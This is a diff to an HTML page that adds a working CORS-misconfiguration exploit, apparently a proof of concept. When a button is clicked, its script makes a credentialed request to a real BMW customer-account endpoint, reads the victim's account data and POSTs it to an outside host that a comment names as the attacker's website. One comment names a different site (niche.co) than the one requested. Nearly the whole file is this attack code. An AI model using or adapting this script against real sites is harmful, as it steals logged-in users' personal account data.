@@ -1,8 +1,24 @@
 <html>
-<head>
-<title>Abra ka Dabra</title>
-</head>
 <body>
-<h1>Abra Ka Dabra, Jayesh hua Bawra</h1>
+<button type='button' onclick='cors()'>CORS</button>
+<p id='demo'></p>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+var a = this.responseText; // Sensitive data from niche.co about user account
+document.getElementById("demo").innerHTML = a;
+xhttp.open("POST", " https://jayeshkunwal.github.io/minicrocs/", true);// Sending that data to Attacker's website
+xhttp.withCredentials = true;
+console.log(a);
+xhttp.send("data="+a);
+}
+};
+xhttp.open("GET", "https://customer.bmwgroup.com/gcdm/protected/minidigital/DE-de/customers?getBuPa=true", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
 </body>
 </html>
